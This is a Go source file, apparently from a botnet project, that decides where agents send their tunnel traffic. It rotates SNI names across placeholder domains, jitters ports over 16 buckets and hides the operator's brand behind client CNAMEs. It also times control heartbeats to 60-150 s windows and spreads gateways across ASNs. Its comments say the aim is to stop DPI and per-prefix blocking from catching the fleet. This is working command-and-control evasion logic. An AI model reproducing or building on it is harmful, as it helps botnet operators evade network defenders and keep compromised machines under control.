package tunnel

import (
	"fmt"
	"hash/fnv"
	"sort"
	"time"

	"github.com/botnet/botnet/pkg/geoip"
)

// Dispersion fija como un agente simula el destino de su tunel: SNI rotado
// por nodo y puerto con jitter (BLUEPRINT §5 "Backoff y dispersion", A1-13).
// El objetivo medible: 50 agentes actualizando a la vez producen histograma
// de puertos con >= 8 buckets y >= 2 SNI distintos — la correlacion
// cadencia-volumen del DPI no ve un unico destino.
type Dispersion struct {
	SNI     []string // >= 2 nombres; rotados por hash del seed
	CNAMEs  []string // >= 2 CNAMEs del cliente: destino compartible (T-1302, A1-01)
	Base    int      // puerto base (443 por defecto)
	Buckets int      // numero de buckets de puerto (>= 8 por contrato DPI)
	Width   int      // ancho de cada bucket en puertos
}

// defaultSNI son los nombres de control canonicos del plano: al menos 2
// dominios con ASNs distintos en produccion (condicion A1-18).
var defaultSNI = []string{"cdn.botnet.example", "api.botnet.example", "dl.botnet.example"}

// defaultCNAMEs son los CNAMEs del cliente bajo los que cuelga el destino
// del operador (deploy/dns/rdv_cname.md): el SNI del nodo es un nombre
// compartible del cliente, no la marca del operador — la nube puede llevar
// trafico ajeno y la firma de destino unico se difumina (T-1302, A1-01).
var defaultCNAMEs = []string{
	"rdv.client-cdn.example",
	"api.client-shop.example",
	"ota.client-home.example",
}

// NewDispersion crea la dispersion por defecto: 16 buckets de 16 puertos
// sobre 443, SNI triplo y CNAMEs compartibles del cliente.
func NewDispersion() *Dispersion {
	return &Dispersion{SNI: defaultSNI, CNAMEs: append([]string(nil), defaultCNAMEs...), Base: 443, Buckets: 16, Width: 16}
}

func hashSeed(seed string) uint64 {
	h := fnv.New64a()
	_, _ = h.Write([]byte(seed))
	return h.Sum64()
}

// ForNode deriva el destino (sni, puerto) del seed del nodo (node_id o mac).
// Determinista por nodo: el destino es estable durante la sesion; cambia al
// rotar identidad, no por reloj.
func (d *Dispersion) ForNode(seed string) (string, int) {
	h := hashSeed(seed)
	bucket := int(h % uint64(d.Buckets))
	if bucket < 0 {
		bucket = -bucket
	}
	off := int((h >> 16) % uint64(d.Width))
	port := d.Base + bucket*d.Width + off
	sni := d.SNI[int(h%uint64(len(d.SNI)))]
	return sni, port
}

// Capture modela la ventana de una release: `agents` seeds simulan los
// nodos que actualizan y devuelve histograma de buckets de puerto, SNI
// distintos y el rango de puertos visto. Es el doble del capture real que
// hara el soak (docs/runbooks/release.md).
type CaptureReport struct {
	BucketsHit map[int]int
	PortMin    int
	PortMax    int
	SNICount   int
	AgentCount int
}

func (d *Dispersion) Capture(agentSeeds []string) CaptureReport {
	rep := CaptureReport{BucketsHit: map[int]int{}, PortMin: 1 << 20, PortMax: -1, AgentCount: len(agentSeeds)}
	snis := map[string]struct{}{}
	for _, seed := range agentSeeds {
		sni, port := d.ForNode(seed)
		snis[sni] = struct{}{}
		bucket := (port - d.Base) / d.Width
		rep.BucketsHit[bucket]++
		if port < rep.PortMin {
			rep.PortMin = port
		}
		if port > rep.PortMax {
			rep.PortMax = port
		}
	}
	rep.SNICount = len(snis)
	return rep
}

// SortedBuckets es util para logs/asserts deterministas.
func (c CaptureReport) SortedBuckets() []int {
	out := make([]int, 0, len(c.BucketsHit))
	for b := range c.BucketsHit {
		out = append(out, b)
	}
	sort.Ints(out)
	return out
}

// ── T-1302: destino compartible por CNAME + ventana de control ────────────

// CNAMEForNode deriva el CNAME del cliente para el seed: determinista por
// nodo (el destino estable durante la sesion), rotado entre >= 2 nombres
// compartibles. El SNI en el ClientHello es este nombre, no el del
// operador (AC1/AC3).
func (d *Dispersion) CNAMEForNode(seed string) string {
	h := hashSeed("cname:" + seed)
	return d.CNAMEs[int(h%uint64(len(d.CNAMEs)))]
}

// Ventana de cadencia de control (AC2, exigencia 4 de A1): los intervalos
// entre frames de control completos — cada 3.er frame de la cadencia unica
// de 40 s ± jitter — deben caer en 60-150 s. Son ventanas por nodo, no
// constantes globales: cada seed repite su propia serie.
const (
	ControlWindowMin = 60 * time.Second
	ControlWindowMax = 150 * time.Second
	controlEvery     = 3 // cada 3.er frame porta el heartbeat (T-0403)
)

// WithinControlWindow dice si un intervalo entre frames de control cae
// dentro de la ventana 60-150 s.
func WithinControlWindow(d time.Duration) bool {
	return d >= ControlWindowMin && d <= ControlWindowMax
}

// ControlIntervals simula la captura de un nodo: `frames` frames de la
// cadencia unica del seed y devuelve los intervalos consecutivos entre
// frames de control. Con la cadencia 40 s ± 4 s, cada suma de 3 tick
// cae en 108-132 s — dentro de la ventana por construccion.
func ControlIntervals(seed string, frames int) []time.Duration {
	c := NewCadence(seed)
	var out []time.Duration
	var acc time.Duration
	for i := 1; i <= frames; i++ {
		acc += c.Next()
		if i%controlEvery == 0 {
			out = append(out, acc)
			acc = 0
		}
	}
	return out
}

// WindowPassRate es la fraccion de intervalos dentro de la ventana: la
// captura de 1 h exige >= 0,95 (AC2).
func WindowPassRate(intervals []time.Duration) float64 {
	if len(intervals) == 0 {
		return 0
	}
	in := 0
	for _, d := range intervals {
		if WithinControlWindow(d) {
			in++
		}
	}
	return float64(in) / float64(len(intervals))
}

// DestinationHistogram cuenta los destinos observados del nodo simulado
// como clave (CNAME del cliente, SNI rotado, bucket de puerto): con el
// CNAME en el SNI, el histograma no puede tener un unico pico (AC3).
type DestinationHistogram map[string]int

func (d *Dispersion) DestinationHistogram(seeds []string) DestinationHistogram {
	h := DestinationHistogram{}
	for _, seed := range seeds {
		sni, port := d.ForNode(seed)
		cname := d.CNAMEForNode(seed)
		bucket := (port - d.Base) / d.Width
		h[fmt.Sprintf("%s|%s#%d", cname, sni, bucket)]++
	}
	return h
}

// Buckets son los buckets ocupados (>= 2 con CNAME y ASNs de T-0407).
func (h DestinationHistogram) Buckets() int { return len(h) }

// MaxShare es la fraccion del pico: "no tiene un unico pico" lo exige
// muy lejos de 1 (sin bucket dominante).
func (h DestinationHistogram) MaxShare() float64 {
	total, peak := 0, 0
	for _, n := range h {
		total += n
		if n > peak {
			peak = n
		}
	}
	if total == 0 {
		return 0
	}
	return float64(peak) / float64(total)
}

// DistinctCNAMEs son los CNAMEs compartibles vistos en el histograma.
func (h DestinationHistogram) DistinctCNAMEs() int {
	set := map[string]struct{}{}
	for k := range h {
		for i := 0; i < len(k); i++ {
			if k[i] == '|' {
				set[k[:i]] = struct{}{}
				break
			}
		}
	}
	return len(set)
}

// ASNBySNI asocia cada destino de control con el ASN del gateway que lo
// sirve, resuelto por la tabla geoip fixture de T-0407 (condicion >= 2
// ASNs de control, A1-18: una politica por prefijo ya no mata la cohorte).
func ASNBySNI() map[string]uint32 {
	table := geoip.DefaultFixture()
	gateways := map[string]string{
		defaultSNI[0]: "192.0.2.10:443",
		defaultSNI[1]: "192.0.2.11:443",
		defaultSNI[2]: "198.51.100.20:443",
	}
	out := map[string]uint32{}
	for sni, gw := range gateways {
		if asn, ok := table.ASNOfGateway(gw, nil); ok {
			out[sni] = asn
		}
	}
	return out
}
